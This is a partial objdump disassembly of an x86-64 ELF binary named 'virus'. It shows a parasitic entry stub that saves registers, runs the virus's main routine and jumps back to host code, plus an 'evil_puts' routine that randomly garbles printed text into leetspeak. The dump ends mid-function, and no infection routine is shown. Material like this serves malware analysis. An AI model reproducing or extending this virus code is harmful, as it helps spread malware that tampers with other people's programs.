
./virus:     file format elf64-x86-64


Disassembly of section .text:

000000000040019c <_start>:
  40019c:	f3 0f 1e fa          	endbr64 
  4001a0:	55                   	push   rbp
  4001a1:	48 89 e5             	mov    rbp,rsp

00000000004001a4 <real_start>:
  4001a4:	54                   	push   rsp
  4001a5:	55                   	push   rbp
  4001a6:	50                   	push   rax
  4001a7:	53                   	push   rbx
  4001a8:	51                   	push   rcx
  4001a9:	52                   	push   rdx
  4001aa:	41 50                	push   r8
  4001ac:	41 51                	push   r9
  4001ae:	41 52                	push   r10
  4001b0:	41 53                	push   r11
  4001b2:	41 54                	push   r12
  4001b4:	41 55                	push   r13
  4001b6:	41 56                	push   r14
  4001b8:	41 57                	push   r15
  4001ba:	e8 34 1b 00 00       	call   401cf3 <do_main>
  4001bf:	41 5f                	pop    r15
  4001c1:	41 5e                	pop    r14
  4001c3:	41 5d                	pop    r13
  4001c5:	41 5c                	pop    r12
  4001c7:	41 5b                	pop    r11
  4001c9:	41 5a                	pop    r10
  4001cb:	41 59                	pop    r9
  4001cd:	41 58                	pop    r8
  4001cf:	5a                   	pop    rdx
  4001d0:	59                   	pop    rcx
  4001d1:	5b                   	pop    rbx
  4001d2:	58                   	pop    rax
  4001d3:	5d                   	pop    rbp
  4001d4:	5c                   	pop    rsp
  4001d5:	48 83 c4 08          	add    rsp,0x8
  4001d9:	e9 7f 2b 00 00       	jmp    402d5d <end_code>
  4001de:	90                   	nop
  4001df:	5d                   	pop    rbp
  4001e0:	c3                   	ret    

00000000004001e1 <evil_puts>:
  4001e1:	f3 0f 1e fa          	endbr64 
  4001e5:	55                   	push   rbp
  4001e6:	48 89 e5             	mov    rbp,rsp
  4001e9:	48 81 ec 40 04 00 00 	sub    rsp,0x440
  4001f0:	48 89 bd c8 fb ff ff 	mov    QWORD PTR [rbp-0x438],rdi
  4001f7:	48 8b 85 c8 fb ff ff 	mov    rax,QWORD PTR [rbp-0x438]
  4001fe:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  400202:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [rbp-0xc],0x0
  400209:	c7 45 ec 05 00 00 00 	mov    DWORD PTR [rbp-0x14],0x5
  400210:	48 8d 85 d0 fb ff ff 	lea    rax,[rbp-0x430]
  400217:	be 00 00 00 00       	mov    esi,0x0
  40021c:	48 89 c7             	mov    rdi,rax
  40021f:	e8 b6 21 00 00       	call   4023da <_gettimeofday>
  400224:	48 8d 85 d0 fb ff ff 	lea    rax,[rbp-0x430]
  40022b:	48 83 c0 08          	add    rax,0x8
  40022f:	48 89 c7             	mov    rdi,rax
  400232:	e8 e1 01 00 00       	call   400418 <_rand>
  400237:	99                   	cdq    
  400238:	f7 7d ec             	idiv   DWORD PTR [rbp-0x14]
  40023b:	89 d0                	mov    eax,edx
  40023d:	89 45 f0             	mov    DWORD PTR [rbp-0x10],eax
  400240:	83 7d f0 03          	cmp    DWORD PTR [rbp-0x10],0x3
  400244:	0f 85 2a 01 00 00    	jne    400374 <evil_puts+0x193>
  40024a:	48 8d 85 e0 fb ff ff 	lea    rax,[rbp-0x420]
  400251:	ba 00 04 00 00       	mov    edx,0x400
  400256:	be 00 00 00 00       	mov    esi,0x0
  40025b:	48 89 c7             	mov    rdi,rax
  40025e:	e8 f8 21 00 00       	call   40245b <Memset>
  400263:	e9 e3 00 00 00       	jmp    40034b <evil_puts+0x16a>
  400268:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  40026c:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  40026f:	0f be c0             	movsx  eax,al
  400272:	89 c7                	mov    edi,eax
  400274:	e8 6a 29 00 00       	call   402be3 <_toupper>
  400279:	0f be c0             	movsx  eax,al
  40027c:	83 e8 41             	sub    eax,0x41
  40027f:	83 f8 13             	cmp    eax,0x13
  400282:	0f 87 a4 00 00 00    	ja     40032c <evil_puts+0x14b>
  400288:	89 c0                	mov    eax,eax
  40028a:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
  400291:	00 
  400292:	48 8d 05 27 2b 00 00 	lea    rax,[rip+0x2b27]        # 402dc0 <display_skeksi+0x42>
  400299:	8b 04 02             	mov    eax,DWORD PTR [rdx+rax*1]
  40029c:	48 98                	cdqe   
  40029e:	48 8d 15 1b 2b 00 00 	lea    rdx,[rip+0x2b1b]        # 402dc0 <display_skeksi+0x42>
  4002a5:	48 01 d0             	add    rax,rdx
  4002a8:	3e ff e0             	notrack jmp rax
  4002ab:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  4002ae:	8d 50 01             	lea    edx,[rax+0x1]
  4002b1:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  4002b4:	48 98                	cdqe   
  4002b6:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x31
  4002bd:	31 
  4002be:	e9 83 00 00 00       	jmp    400346 <evil_puts+0x165>
  4002c3:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  4002c6:	8d 50 01             	lea    edx,[rax+0x1]
  4002c9:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  4002cc:	48 98                	cdqe   
  4002ce:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x33
  4002d5:	33 
  4002d6:	eb 6e                	jmp    400346 <evil_puts+0x165>
  4002d8:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  4002db:	8d 50 01             	lea    edx,[rax+0x1]
  4002de:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  4002e1:	48 98                	cdqe   
  4002e3:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x35
  4002ea:	35 
  4002eb:	eb 59                	jmp    400346 <evil_puts+0x165>
  4002ed:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  4002f0:	8d 50 01             	lea    edx,[rax+0x1]
  4002f3:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  4002f6:	48 98                	cdqe   
  4002f8:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x37
  4002ff:	37 
  400300:	eb 44                	jmp    400346 <evil_puts+0x165>
  400302:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  400305:	8d 50 01             	lea    edx,[rax+0x1]
  400308:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  40030b:	48 98                	cdqe   
  40030d:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x30
  400314:	30 
  400315:	eb 2f                	jmp    400346 <evil_puts+0x165>
  400317:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  40031a:	8d 50 01             	lea    edx,[rax+0x1]
  40031d:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  400320:	48 98                	cdqe   
  400322:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x34
  400329:	34 
  40032a:	eb 1a                	jmp    400346 <evil_puts+0x165>
  40032c:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  40032f:	8d 50 01             	lea    edx,[rax+0x1]
  400332:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  400335:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
  400339:	0f b6 12             	movzx  edx,BYTE PTR [rdx]
  40033c:	48 98                	cdqe   
  40033e:	88 94 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],dl
  400345:	90                   	nop
  400346:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  40034b:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  40034f:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  400352:	84 c0                	test   al,al
  400354:	74 0d                	je     400363 <evil_puts+0x182>
  400356:	81 7d f4 ff 03 00 00 	cmp    DWORD PTR [rbp-0xc],0x3ff
  40035d:	0f 8e 05 ff ff ff    	jle    400268 <evil_puts+0x87>
  400363:	48 8d 85 e0 fb ff ff 	lea    rax,[rbp-0x420]
  40036a:	48 89 c7             	mov    rdi,rax
  40036d:	e8 e7 27 00 00       	call   402b59 <_puts_nl>
  400372:	eb 14                	jmp    400388 <evil_puts+0x1a7>
  400374:	90                   	nop
  400375:	f3 0f 1e fa          	endbr64 
  400379:	48 8b 85 c8 fb ff ff 	mov    rax,QWORD PTR [rbp-0x438]
  400380:	48 89 c7             	mov    rdi,rax
  400383:	e8 d1 27 00 00       	call   402b59 <_puts_nl>
  400388:	c9                   	leave  
  400389:	c3                   	ret    

000000000040038a <vx_malloc>:
  40038a:	f3 0f 1e fa          	endbr64 
  40038e:	55                   	push   rbp
  40038f:	48 89 e5             	mov    rbp,rsp
  400392:	48 83 ec 10          	sub    rsp,0x10
  400396:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  40039a:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
